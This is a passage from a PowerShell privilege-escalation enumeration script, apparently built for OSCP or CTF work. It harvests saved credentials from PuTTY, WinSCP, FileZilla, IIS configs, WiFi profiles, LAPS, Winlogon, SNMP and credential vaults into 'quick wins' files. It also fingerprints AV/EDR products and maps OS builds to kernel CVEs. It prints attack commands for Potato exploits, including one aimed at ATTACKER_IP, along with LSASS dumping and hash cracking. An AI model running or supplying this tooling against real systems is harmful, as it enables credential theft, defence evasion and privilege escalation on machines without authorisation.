            if ($session.UserName) { Add-Content -Path $InterestingFile -Value "  User: $($session.UserName)" }
            if ($session.ProxyUsername) { Add-Content -Path $InterestingFile -Value "  ProxyUser: $($session.ProxyUsername)" }
            if ($session.ProxyPassword) { Add-Content -Path $InterestingFile -Value "  ProxyPass: $($session.ProxyPassword)" }
            Add-Content -Path $InterestingFile -Value ""
            $found = $true
        }
    }

    # PuTTY SSH host keys (shows connection history)
    $puttySshKeys = Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\SshHostKeys" -ErrorAction SilentlyContinue
    if ($puttySshKeys) {
        Write-Interesting "PuTTY SSH host key cache found (connection history)"
        $puttySshKeys.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
            Add-Content -Path $InterestingFile -Value "  Known host: $($_.Name)"
        }
        Add-Content -Path $InterestingFile -Value ""
        $found = $true
    }

    # WinSCP
    $winscpKeys = Get-ItemProperty "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions\*" -ErrorAction SilentlyContinue
    if ($winscpKeys) {
        foreach ($session in $winscpKeys) {
            $finding = "WinSCP session found: $($session.PSChildName)"
            Write-QuickWin $finding
            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"

            if ($session.HostName) { Add-Content -Path $QuickWinsFile -Value "  Host: $($session.HostName)" }
            if ($session.UserName) { Add-Content -Path $QuickWinsFile -Value "  User: $($session.UserName)" }
            if ($session.Password)  { Add-Content -Path $QuickWinsFile -Value "  Password (encrypted): $($session.Password)" }
            Add-Content -Path $QuickWinsFile -Value "  Decrypt with: winscppasswd.py`n"
            $found = $true
        }
    }

    # FileZilla
    $filezillaPaths = @(
        "$env:APPDATA\FileZilla\recentservers.xml",
        "$env:APPDATA\FileZilla\sitemanager.xml"
    )

    foreach ($fzPath in $filezillaPaths) {
        if (Test-Path $fzPath) {
            $finding = "FileZilla credentials file found: $fzPath"
            Write-QuickWin $finding
            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"

            try {
                $content = Get-Content $fzPath -Raw -ErrorAction Stop
                $hostMatches = [regex]::Matches($content, '<Host>([^<]+)</Host>')
                $userMatches = [regex]::Matches($content, '<User>([^<]+)</User>')
                $passMatches = [regex]::Matches($content, '<Pass[^>]*>([^<]+)</Pass>')

                for ($i = 0; $i -lt $hostMatches.Count; $i++) {
                    $h = if ($i -lt $hostMatches.Count) { $hostMatches[$i].Groups[1].Value } else { "?" }
                    $u = if ($i -lt $userMatches.Count) { $userMatches[$i].Groups[1].Value } else { "?" }
                    $p = if ($i -lt $passMatches.Count) { $passMatches[$i].Groups[1].Value } else { "?" }
                    Add-Content -Path $QuickWinsFile -Value "  Server: $h | User: $u | Pass: $p"
                }
            }
            catch {
                Add-Content -Path $QuickWinsFile -Value "  Could not read file contents"
            }

            Copy-Item $fzPath (Join-Path $Output "filezilla_$(Split-Path $fzPath -Leaf)") -ErrorAction SilentlyContinue
            Add-Content -Path $QuickWinsFile -Value ""
            $found = $true
        }
    }

    if (!$found) {
        Write-Host "  No PuTTY/WinSCP/FileZilla credentials found"
    }

    return $found
}

function Check-IISWebConfig {
    Write-Info "Checking IIS web.config files for credentials..."

    $found = $false
    $searchPaths = @(
        "C:\inetpub\wwwroot",
        "C:\inetpub",
        "C:\websites"
    )

    foreach ($searchPath in $searchPaths) {
        if (Test-Path $searchPath) {
            $configs = Get-ChildItem -Path $searchPath -Recurse -Include "web.config","applicationHost.config" -ErrorAction SilentlyContinue

            foreach ($config in $configs) {
                try {
                    $content = Get-Content $config.FullName -Raw -ErrorAction Stop

                    if ($content -match "connectionString|password|pwd=|User ID=|credentials") {
                        $finding = "IIS web.config with potential credentials: $($config.FullName)"
                        Write-QuickWin $finding
                        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"

                        $connStrings = [regex]::Matches($content, '(?i)connectionString="([^"]+)"')
                        foreach ($cs in $connStrings) {
                            Add-Content -Path $QuickWinsFile -Value "  ConnectionString: $($cs.Groups[1].Value)"
                        }

                        $passFields = [regex]::Matches($content, '(?i)(password|pwd)\s*[=:]\s*"?([^";]+)')
                        foreach ($pf in $passFields) {
                            Add-Content -Path $QuickWinsFile -Value "  $($pf.Value)"
                        }

                        Copy-Item $config.FullName (Join-Path $Output "webconfig_$(Split-Path $config.FullName -Leaf)_$([guid]::NewGuid().ToString('N').Substring(0,8))") -ErrorAction SilentlyContinue
                        Add-Content -Path $QuickWinsFile -Value ""
                        $found = $true
                    }
                }
                catch {
                    continue
                }
            }
        }
    }

    # Also check machine.config
    $machineConfigs = @(
        "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config",
        "C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config"
    )

    foreach ($mc in $machineConfigs) {
        if (Test-Path $mc) {
            try {
                $content = Get-Content $mc -Raw -ErrorAction Stop
                if ($content -match "connectionString|password") {
                    Write-Interesting "Machine-level web.config has connection strings: $mc"
                    Add-Content -Path $InterestingFile -Value "[+] Machine web.config: $mc`n"
                    $found = $true
                }
            }
            catch {
                continue
            }
        }
    }

    if (!$found) {
        Write-Host "  No IIS web.config credentials found"
    }

    return $found
}

function Check-PrintSpooler {
    Write-Info "Checking Print Spooler service status..."

    $found = $false

    try {
        $spooler = Get-Service -Name Spooler -ErrorAction Stop

        if ($spooler.Status -eq "Running") {
            $finding = "Print Spooler is running (potential PrintSpoofer/PrintNightmare)"
            Write-Interesting $finding
            Add-Content -Path $InterestingFile -Value "[+] $finding"
            Add-Content -Path $InterestingFile -Value "  PrintSpoofer: If SeImpersonatePrivilege is enabled"
            Add-Content -Path $InterestingFile -Value "  PrintNightmare (CVE-2021-1675/CVE-2021-34527): RCE via AddPrinterDriverEx"
            Add-Content -Path $InterestingFile -Value "  Check: ls \\localhost\pipe\spoolss"

            # Check for Point and Print NoWarningNoElevationOnInstall
            $noWarn = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name NoWarningNoElevationOnInstall -ErrorAction SilentlyContinue).NoWarningNoElevationOnInstall
            if ($noWarn -eq 1) {
                Add-Content -Path $InterestingFile -Value "  [!] NoWarningNoElevationOnInstall = 1 (PrintNightmare exploitable!)"
                Write-QuickWin "PrintNightmare: NoWarningNoElevationOnInstall is enabled!"
                Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] PrintNightmare: NoWarningNoElevationOnInstall = 1`n"
            }

            Add-Content -Path $InterestingFile -Value ""
            $found = $true
        }
        else {
            Write-Host "  Print Spooler is not running"
        }
    }
    catch {
        Write-Host "  Could not query Print Spooler service"
    }

    return $found
}

function Check-WiFiPasswords {
    Write-Info "Enumerating stored WiFi passwords..."

    $found = $false

    try {
        $profiles = netsh wlan show profiles 2>$null
        $profileNames = $profiles | Select-String "All User Profile\s*:\s*(.+)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }

        foreach ($profileName in $profileNames) {
            $profileDetail = netsh wlan show profile name="$profileName" key=clear 2>$null
            $keyContent = $profileDetail | Select-String "Key Content\s*:\s*(.+)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }

            if ($keyContent) {
                $finding = "WiFi password found — SSID: $profileName | Key: $keyContent"
                Write-QuickWin $finding
                Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding`n"
                $found = $true
            }
            else {
                Write-Host "  WiFi profile: $profileName (no cleartext key)"
            }
        }

        if (!$profileNames -or $profileNames.Count -eq 0) {
            Write-Host "  No WiFi profiles found"
        }
    }
    catch {
        Write-Host "  Error enumerating WiFi profiles"
    }

    return $found
}

function Check-LAPS {
    Write-Info "Checking for LAPS (Local Administrator Password Solution)..."

    $found = $false

    # Check if LAPS DLL is installed
    $lapsDll = "C:\Program Files\LAPS\CSE\AdmPwd.dll"
    $lapsInstalled = Test-Path $lapsDll

    # Also check registry
    $lapsReg = Get-ItemProperty "HKLM:\Software\Policies\Microsoft Services\AdmPwd" -ErrorAction SilentlyContinue

    if ($lapsInstalled -or $lapsReg) {
        Write-Interesting "LAPS is installed on this machine"
        Add-Content -Path $InterestingFile -Value "[+] LAPS is installed"

        # Try to read the LAPS password via AD
        try {
            $computerName = $env:COMPUTERNAME
            $searcher = New-Object DirectoryServices.DirectorySearcher
            $searcher.Filter = "(&(objectCategory=computer)(name=$computerName))"
            $searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwd") | Out-Null
            $searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwdExpirationTime") | Out-Null
            $result = $searcher.FindOne()

            if ($result) {
                $lapsPassword = $result.Properties["ms-mcs-admpwd"]
                if ($lapsPassword) {
                    $finding = "LAPS password readable: $($lapsPassword[0])"
                    Write-QuickWin $finding
                    Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding`n"
                    $found = $true
                }
                else {
                    Add-Content -Path $InterestingFile -Value "  LAPS password attribute not readable (insufficient permissions)"
                }
            }
        }
        catch {
            Add-Content -Path $InterestingFile -Value "  Could not query AD for LAPS password (not domain-joined or no access)"
        }

        Add-Content -Path $InterestingFile -Value ""
        $found = $true
    }
    else {
        Write-Host "  LAPS is not installed"
    }

    return $found
}

function Check-WDigest {
    Write-Info "Checking WDigest UseLogonCredential setting..."

    $found = $false

    $wdigestValue = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -ErrorAction SilentlyContinue).UseLogonCredential

    if ($wdigestValue -eq 1) {
        $finding = "WDigest UseLogonCredential = 1 — cleartext passwords stored in LSASS!"
        Write-QuickWin $finding
        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
        Add-Content -Path $QuickWinsFile -Value "  Exploit: Dump LSASS to get cleartext credentials"
        Add-Content -Path $QuickWinsFile -Value "  Tools: mimikatz sekurlsa::wdigest, procdump, comsvcs.dll MiniDump`n"
        $found = $true
    }
    else {
        Write-Host "  WDigest cleartext caching is disabled (default on Win 8.1+)"
    }

    return $found
}

function Check-CredentialManagerVault {
    Write-Info "Enumerating Credential Manager / Vault..."

    $found = $false

    try {
        $vaultOutput = & vaultcmd /listcreds:"Windows Credentials" /all 2>$null
        $webVault = & vaultcmd /listcreds:"Web Credentials" /all 2>$null

        if ($vaultOutput -and ($vaultOutput | Select-String "Credential")) {
            $finding = "Windows Credential Vault entries found"
            Write-QuickWin $finding
            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"

            foreach ($line in $vaultOutput) {
                $trimmed = $line.Trim()
                if ($trimmed -ne "") {
                    Add-Content -Path $QuickWinsFile -Value "  $trimmed"
                }
            }
            Add-Content -Path $QuickWinsFile -Value ""
            $found = $true
        }

        if ($webVault -and ($webVault | Select-String "Credential")) {
            $finding = "Web Credential Vault entries found"
            Write-Interesting $finding
            Add-Content -Path $InterestingFile -Value "[+] $finding"

            foreach ($line in $webVault) {
                $trimmed = $line.Trim()
                if ($trimmed -ne "") {
                    Add-Content -Path $InterestingFile -Value "  $trimmed"
                }
            }
            Add-Content -Path $InterestingFile -Value ""
            $found = $true
        }
    }
    catch {
        Write-Host "  Error querying Credential Vault"
    }

    # Also try cmdlet approach
    try {
        $creds = cmdkey /list 2>$null
        if ($creds -and ($creds | Select-String "Target:")) {
            # Already handled by Check-SavedCredentials, just log to file
            $creds | Out-File -FilePath (Join-Path $Output "credential_vault.txt")
        }
    }
    catch {}

    if (!$found) {
        Write-Host "  No Credential Vault entries found"
    }

    return $found
}

function Check-MountedDrivesNetworkShares {
    Write-Info "Enumerating mounted drives and network shares..."

    $found = $false

    # net use
    $netUse = net use 2>$null
    if ($netUse) {
        $connections = $netUse | Select-String "\\\\"
        if ($connections) {
            foreach ($conn in $connections) {
                Write-Interesting "Network connection: $($conn.Line.Trim())"
                Add-Content -Path $InterestingFile -Value "[+] Network share: $($conn.Line.Trim())"
            }
            Add-Content -Path $InterestingFile -Value ""
            $found = $true
        }
    }

    # WMI mapped drives
    try {
        $mappedDrives = Get-WmiObject -Class Win32_MappedLogicalDisk -ErrorAction Stop
        if ($mappedDrives) {
            foreach ($drive in $mappedDrives) {
                $info = "Mapped drive: $($drive.DeviceID) -> $($drive.ProviderName)"
                Write-Interesting $info
                Add-Content -Path $InterestingFile -Value "[+] $info"
                $found = $true
            }
            Add-Content -Path $InterestingFile -Value ""
        }
    }
    catch {}

    # PSDrives
    $psDrives = Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue | Where-Object { $_.Root -match "\\\\" }
    if ($psDrives) {
        foreach ($drive in $psDrives) {
            Write-Interesting "PS mapped drive: $($drive.Name): -> $($drive.Root)"
            Add-Content -Path $InterestingFile -Value "[+] PS drive: $($drive.Name): -> $($drive.Root)"
        }
        Add-Content -Path $InterestingFile -Value ""
        $found = $true
    }

    # Save all to file
    net use 2>$null | Out-File -FilePath (Join-Path $Output "network_shares.txt")
    net share 2>$null | Out-File -Append -FilePath (Join-Path $Output "network_shares.txt")

    if (!$found) {
        Write-Host "  No mounted network drives/shares found"
    }

    return $found
}

function Check-WSUSNonSSL {
    Write-Info "Checking WSUS configuration for non-SSL..."

    $found = $false

    $wuServer = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer

    if ($wuServer) {
        Write-Host "  WSUS Server: $wuServer"

        if ($wuServer -match "^http://") {
            $finding = "WSUS uses HTTP (non-SSL): $wuServer — vulnerable to WSUS poisoning!"
            Write-QuickWin $finding
            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
            Add-Content -Path $QuickWinsFile -Value "  Exploit: SharpWSUS or WSUSpect to inject malicious updates"
            Add-Content -Path $QuickWinsFile -Value "  Tool: https://github.com/nettitude/SharpWSUS`n"
            $found = $true
        }
        else {
            Write-Host "  WSUS uses HTTPS (not vulnerable to basic WSUS poisoning)"
        }
    }
    else {
        Write-Host "  WSUS is not configured"
    }

    return $found
}

function Check-AVEDREnumeration {
    Write-Info "Enumerating AV/EDR/security products..."

    $found = $false

    $knownProducts = @{
        "MsMpEng"           = "Windows Defender"
        "MsSense"           = "Microsoft Defender for Endpoint (EDR)"
        "SenseIR"           = "Microsoft Defender for Endpoint (IR)"
        "SenseNdr"          = "Microsoft Defender for Endpoint (NDR)"
        "CylanceSvc"        = "Cylance"
        "CbDefense"         = "Carbon Black Defense"
        "CbStream"          = "Carbon Black (Streaming)"
        "RepMgr"            = "Carbon Black (RepMgr)"
        "csfalconservice"   = "CrowdStrike Falcon"
        "CSFalconService"   = "CrowdStrike Falcon"
        "xagt"              = "FireEye/Trellix Agent"
        "SentinelAgent"     = "SentinelOne"
        "SentinelOne"       = "SentinelOne"
        "SentinelStaticEngine" = "SentinelOne (Static)"
        "elastic-agent"     = "Elastic Agent"
        "elastic-endpoint"  = "Elastic Endpoint"
        "winlogbeat"        = "Elastic Winlogbeat"
        "DVPAPI"            = "Digital Vaccine (TippingPoint)"
        "kavfswp"           = "Kaspersky"
        "avp"               = "Kaspersky"
        "SEPMasterService"  = "Symantec Endpoint Protection"
        "SepMasterService"  = "Symantec Endpoint Protection"
        "ccSvcHst"          = "Symantec/Norton"
        "savservice"        = "Sophos AV"
        "SophosAgent"       = "Sophos Agent"
        "hmpalert"          = "Sophos Intercept X"
        "egui"              = "ESET"
        "ekrn"              = "ESET Kernel"
        "bdagent"           = "Bitdefender"
        "EPSecurityService" = "Bitdefender"
        "WRCoreService"     = "Webroot"
        "TmCCSF"            = "Trend Micro"
        "NTRTScan"          = "Trend Micro OfficeScan"
        "PccNTMon"          = "Trend Micro"
        "Sysmon"            = "Sysmon (Logging)"
        "Sysmon64"          = "Sysmon 64-bit (Logging)"
        "osqueryd"          = "osquery (Logging)"
        "Tanium"            = "Tanium"
        "TaniumClient"      = "Tanium Client"
    }

    $runningProcs = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name -Unique

    $detectedProducts = @()

    foreach ($proc in $runningProcs) {
        if ($knownProducts.ContainsKey($proc)) {
            $product = $knownProducts[$proc]
            if ($detectedProducts -notcontains $product) {
                $detectedProducts += $product
                Write-Color "  [AV/EDR] $product ($proc)" "Red"
            }
        }
    }

    # Also check services
    $runningServices = Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" } | Select-Object -ExpandProperty Name

    foreach ($svc in $runningServices) {
        if ($knownProducts.ContainsKey($svc)) {
            $product = $knownProducts[$svc]
            if ($detectedProducts -notcontains $product) {
                $detectedProducts += $product
                Write-Color "  [AV/EDR] $product (service: $svc)" "Red"
            }
        }
    }

    # WMI AntiVirusProduct
    try {
        $wmiAV = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop
        foreach ($av in $wmiAV) {
            $name = $av.displayName
            if ($detectedProducts -notcontains $name) {
                $detectedProducts += $name
                Write-Color "  [AV/EDR] $name (WMI)" "Red"
            }
        }
    }
    catch {}

    if ($detectedProducts.Count -gt 0) {
        $finding = "Security products detected: $($detectedProducts -join ', ')"
        Write-Interesting $finding
        Add-Content -Path $InterestingFile -Value "[+] $finding"
        foreach ($p in $detectedProducts) {
            Add-Content -Path $InterestingFile -Value "  - $p"
        }
        Add-Content -Path $InterestingFile -Value ""
        $found = $true
    }
    else {
        Write-Host "  No known AV/EDR products detected"
    }

    # Save full list
    $detectedProducts | Out-File -FilePath (Join-Path $Output "av_edr_products.txt")

    return $found
}

function Check-KernelExploits {
    Write-Info "Enumerating installed hotfixes and checking patch level..."

    $found = $false

    # Get OS version
    $osVersion = [System.Environment]::OSVersion.Version
    $osBuild = $osVersion.Build
    $osCaption = (Get-WmiObject -Class Win32_OperatingSystem).Caption

    Write-Host "  OS: $osCaption"
    Write-Host "  Build: $osVersion"

    # Get hotfixes
    $hotfixes = Get-HotFix -ErrorAction SilentlyContinue | Sort-Object InstalledOn -Descending -ErrorAction SilentlyContinue

    if ($hotfixes) {
        $latestPatch = $hotfixes | Where-Object { $_.InstalledOn } | Select-Object -First 1
        if ($latestPatch) {
            $daysSinceLastPatch = (New-TimeSpan -Start $latestPatch.InstalledOn -End (Get-Date)).Days
            Write-Host "  Last patch: $($latestPatch.HotFixID) on $($latestPatch.InstalledOn) ($daysSinceLastPatch days ago)"

            if ($daysSinceLastPatch -gt 180) {
                $finding = "System is $daysSinceLastPatch days behind on patches (last: $($latestPatch.InstalledOn))"
                Write-QuickWin $finding
                Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                Add-Content -Path $QuickWinsFile -Value "  Check: windows-exploit-suggester.py --systeminfo systeminfo.txt"
                Add-Content -Path $QuickWinsFile -Value "  Check: Sherlock.ps1 or Watson`n"
                $found = $true
            }
            elseif ($daysSinceLastPatch -gt 90) {
                $finding = "System is $daysSinceLastPatch days behind on patches"
                Write-Interesting $finding
                Add-Content -Path $InterestingFile -Value "[+] $finding`n"
                $found = $true
            }
        }
    }
    else {
        Write-Interesting "Could not retrieve hotfix list — may indicate limited access"
        Add-Content -Path $InterestingFile -Value "[+] Hotfix enumeration failed`n"
    }

    # Known vulnerable builds (non-exhaustive, covers major kernel privesc)
    $vulnerableBuilds = @{
        7600  = @("MS11-011", "MS11-046", "MS11-080", "MS14-058", "MS15-051", "MS16-032")
        7601  = @("MS16-032", "MS16-016", "MS15-051", "MS14-058")
        9200  = @("MS16-032", "MS16-135")
        9600  = @("MS16-032", "MS16-075")
        10240 = @("MS16-032")
        10586 = @("CVE-2016-7255")
        14393 = @("CVE-2019-1458", "CVE-2020-0787 (BitsArbitrary)")
        15063 = @("CVE-2019-1458")
        16299 = @("CVE-2019-1458", "CVE-2021-1732")
        17134 = @("CVE-2019-1458", "CVE-2021-1732")
        17763 = @("CVE-2021-1732", "CVE-2021-36934 (HiveNightmare)")
        18362 = @("CVE-2021-1732", "CVE-2021-36934")
        18363 = @("CVE-2021-1732", "CVE-2021-36934")
        19041 = @("CVE-2021-36934", "CVE-2021-1732")
        19042 = @("CVE-2021-36934")
        19043 = @("CVE-2021-36934")
        19044 = @("CVE-2021-36934", "CVE-2022-21882")
        19045 = @("CVE-2022-21882")
    }

    if ($vulnerableBuilds.ContainsKey($osBuild)) {
        $vulns = $vulnerableBuilds[$osBuild]
        $finding = "OS build $osBuild may be vulnerable to: $($vulns -join ', ')"
        Write-QuickWin $finding
        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
        Add-Content -Path $QuickWinsFile -Value "  Run watson or windows-exploit-suggester for confirmation"
        Add-Content -Path $QuickWinsFile -Value "  Build: $osVersion | OS: $osCaption`n"
        $found = $true
    }

    # Save all hotfixes
    $hotfixes | Out-File -FilePath (Join-Path $Output "hotfixes.txt")

    return $found
}

###########################################
# EP PDF CHECKS (from OSCP/CTF notes)
###########################################

function Check-PotatoAttacks {
    Write-Color "`n[*] Checking Potato Attack Vectors" "Blue"

    $privs = whoami /priv 2>$null
    $hasImpersonate = $privs -match "SeImpersonatePrivilege.*Enabled"
    $hasAssignPrimary = $privs -match "SeAssignPrimaryTokenPrivilege.*Enabled"

    if ($hasImpersonate -or $hasAssignPrimary) {
        Write-QuickWin "SeImpersonate/SeAssignPrimaryToken enabled! Potato attacks available:"
        Write-Host "  JuicyPotato: JuicyPotato.exe -l 1337 -p cmd.exe -a '/c whoami' -t *"
        Write-Host "  PrintSpoofer: PrintSpoofer.exe -i -c cmd"
        Write-Host "  GodPotato: GodPotato.exe -cmd 'cmd /c whoami'"
        Write-Host "  SweetPotato: SweetPotato.exe -p cmd.exe -a '/c whoami'"
        Write-Host "  RoguePotato: RoguePotato.exe -r ATTACKER_IP -e 'cmd /c whoami' -l 9999"

        # Check OS version for best potato
        $build = [System.Environment]::OSVersion.Version.Build
        if ($build -lt 17134) {
            Write-Host "  Recommended: JuicyPotato (build < 17134)"
        } elseif ($build -lt 19041) {
            Write-Host "  Recommended: RoguePotato or PrintSpoofer"
        } else {
            Write-Host "  Recommended: GodPotato or PrintSpoofer (Win10 2004+)"
        }
        return $true
    }
    Write-Info "SeImpersonate/SeAssignPrimaryToken not enabled"
    return $false
}

function Check-AlternateDataStreams {
    Write-Color "`n[*] Checking for Alternate Data Streams" "Blue"
    $found = $false
    $searchPaths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "C:\Users\Public", "C:\inetpub\wwwroot")

    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            $adsFiles = Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                $streams = Get-Item -Path $_.FullName -Stream * -ErrorAction SilentlyContinue | Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' }
                if ($streams) { $_ }
            }
            if ($adsFiles) {
                Write-Interesting "Files with Alternate Data Streams in ${path}:"
                foreach ($f in $adsFiles) {
                    $streams = Get-Item -Path $f.FullName -Stream * -ErrorAction SilentlyContinue | Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' }
                    foreach ($s in $streams) {
                        Write-Host "  $($f.FullName):$($s.Stream) ($($s.Length) bytes)"
                    }
                }
                $found = $true
            }
        }
    }
    if (!$found) { Write-Info "No interesting ADS found" }
    return $found
}

function Check-WinlogonCredentials {
    Write-Color "`n[*] Checking Winlogon Credentials" "Blue"
    $found = $false
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $defaultUser = (Get-ItemProperty -Path $regPath -Name "DefaultUserName" -ErrorAction SilentlyContinue).DefaultUserName
    $defaultPass = (Get-ItemProperty -Path $regPath -Name "DefaultPassword" -ErrorAction SilentlyContinue).DefaultPassword
    $autoAdmin = (Get-ItemProperty -Path $regPath -Name "AutoAdminLogon" -ErrorAction SilentlyContinue).AutoAdminLogon

    if ($defaultPass) {
        Write-QuickWin "Winlogon DefaultPassword found! User: $defaultUser Password: $defaultPass (AutoAdminLogon: $autoAdmin)"
        $found = $true
    } elseif ($defaultUser -and $autoAdmin -eq "1") {
        Write-Interesting "AutoAdminLogon enabled for user: $defaultUser (password may be cached)"
    } else {
        Write-Info "No Winlogon credentials found"
    }
    return $found
}

function Check-SNMPCredentials {
    Write-Color "`n[*] Checking SNMP Community Strings" "Blue"
    $found = $false
    try {
        $communities = reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities" 2>$null
        if ($communities -and $communities -notmatch "ERROR") {
            Write-QuickWin "SNMP community strings found (can be used as passwords):"
            Write-Host $communities
            $found = $true
        }
    } catch {}

    try {
        $snmpTrap = reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\TrapConfiguration" /s 2>$null
        if ($snmpTrap -and $snmpTrap -notmatch "ERROR") {
            Write-Interesting "SNMP Trap configuration:"
            Write-Host $snmpTrap
        }
    } catch {}

    if (!$found) { Write-Info "No SNMP credentials found" }
    return $found
}

function Check-SecureStringFiles {
    Write-Color "`n[*] Checking for SecureString/PSCredential Files" "Blue"
    $found = $false
    $searchPaths = @("$env:USERPROFILE", "C:\Users\*")

    $credFiles = Get-ChildItem -Path $searchPaths -Recurse -Include "*.xml","*.clixml","*.credential" -ErrorAction SilentlyContinue | Where-Object {
        $content = Get-Content $_.FullName -ErrorAction SilentlyContinue -Raw
        $content -match "SecureString|PSCredential|System.Security.SecureString|ConvertTo-SecureString"
    }

    if ($credFiles) {
        Write-QuickWin "SecureString/PSCredential files found (decrypt with user context):"
        foreach ($f in $credFiles) {
            Write-Host "  $($f.FullName)"
            Write-Host "    Decrypt: `$cred = Import-Clixml '$($f.FullName)'; `$cred.GetNetworkCredential().Password"
        }
        $found = $true
    } else {
        Write-Info "No SecureString credential files found"
    }
    return $found
}

function Check-ThunderbirdStickyNotes {
    Write-Color "`n[*] Checking Thunderbird Profiles & Sticky Notes" "Blue"
    $found = $false
    # Thunderbird
    $tbProfiles = Get-ChildItem "$env:APPDATA\Thunderbird\Profiles\*" -ErrorAction SilentlyContinue
    if ($tbProfiles) {
        Write-Interesting "Thunderbird profiles found (may contain saved passwords):"
        foreach ($p in $tbProfiles) {
            Write-Host "  $($p.FullName)"
            if (Test-Path "$($p.FullName)\logins.json") {
                Write-Host "    logins.json EXISTS (extract with: SharpScribbles ThunderbirdExtract)"
            }
        }
        $found = $true
    }
    # Sticky Notes
    $stickyDb = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
    if (Test-Path $stickyDb) {
        Write-Interesting "Sticky Notes database found! May contain credentials:"
        Write-Host "  $stickyDb"
        Write-Host "  Extract with: SharpScribbles StickyNotesExtract"
        $found = $true
    }
    if (!$found) { Write-Info "No Thunderbird/Sticky Notes data found" }
    return $found
}

function Check-KeePassFiles {
    Write-Color "`n[*] Checking for KeePass/Password Manager Files" "Blue"
    $found = $false
    $kdbFiles = Get-ChildItem -Path "C:\Users" -Recurse -Include "*.kdbx","*.kdb","*.psafe3","*.1pif" -ErrorAction SilentlyContinue
    if ($kdbFiles) {
        Write-Interesting "Password manager databases found:"
        foreach ($f in $kdbFiles) {
            Write-Host "  $($f.FullName) ($([math]::Round($f.Length/1KB))KB)"
        }
        Write-Host "  Crack with: keepass2john file.kdbx > hash.txt && hashcat -m 13400 hash.txt wordlist"
        $found = $true
    }
    # KeePass config with recent files
    $kpConfig = Get-ChildItem -Path "C:\Users" -Recurse -Include "KeePass.config.xml" -ErrorAction SilentlyContinue
    if ($kpConfig) {
        foreach ($f in $kpConfig) {
            Write-Interesting "KeePass config: $($f.FullName)"
            Select-String -Path $f.FullName -Pattern "LastUsedFile|RecentlyUsed" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "  $($_.Line.Trim())" }
        }
        $found = $true
    }
    if (!$found) { Write-Info "No password manager files found" }
    return $found
}

function Check-BrowserCredentials {
    Write-Color "`n[*] Checking Browser Credential Stores" "Blue"
    $found = $false
    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    }
    foreach ($name in $browsers.Keys) {
        $path = $browsers[$name]
        if (Test-Path $path) {
            Write-Interesting "$name credential store found:"
            Write-Host "  $path"
            Write-Host "  Extract with: SharpChrome logins /unprotect or LaZagne.exe browsers"
            $found = $true
        }
    }
    if (!$found) { Write-Info "No browser credential stores found" }
    return $found
}

function Check-RDPSavedConnections {
    Write-Color "`n[*] Checking RDP Saved Connections" "Blue"
    $found = $false
    try {
        $rdpServers = reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>$null
        if ($rdpServers -and $rdpServers -notmatch "ERROR" -and $rdpServers.Length -gt 5) {
            Write-Interesting "RDP saved connections (may reveal targets + usernames):"
            Write-Host $rdpServers
            $found = $true
        }
    } catch {}
    # Default.rdp files
    $rdpFiles = Get-ChildItem -Path "C:\Users" -Recurse -Include "*.rdp" -ErrorAction SilentlyContinue
    if ($rdpFiles) {
        Write-Interesting "RDP files found:"
        foreach ($f in $rdpFiles) {
            Write-Host "  $($f.FullName)"
            Select-String -Path $f.FullName -Pattern "full address|username" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "    $($_.Line.Trim())" }
        }
        $found = $true
    }
    if (!$found) { Write-Info "No RDP saved connections found" }
    return $found
}

###########################################
# MAIN EXECUTION
###########################################

$quickWinsFound = $false

Write-Color "`n=== QUICK WINS CHECK ===" "Yellow"
Write-Host ""

$quickWinsFound = Check-AlwaysInstallElevated -or $quickWinsFound
